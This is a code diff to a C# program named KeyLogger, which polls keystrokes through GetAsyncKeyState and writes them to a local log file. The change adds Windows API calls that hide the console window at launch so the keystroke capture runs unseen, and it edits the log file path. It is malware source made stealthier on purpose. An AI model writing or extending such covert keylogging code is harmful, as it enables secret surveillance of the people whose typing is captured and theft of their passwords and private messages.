@@ -15,14 +15,26 @@ namespace KeyLogger
         [DllImport("User32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
+
         static void Main(string[] args)
         {
+            IntPtr handle = GetConsoleWindow();
+            ShowWindow(handle, SW_HIDE);
+            Console.Read();
             LogKeys();
         }
 
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
         static void LogKeys()
         {
-            String path = (@"C:\Users\Alan\Documents\general\KeyLog.text");
+            String path = (@"C:\Users\ok\Documents\general\KeyLog.text");
             
             if(!File.Exists(path))
             {
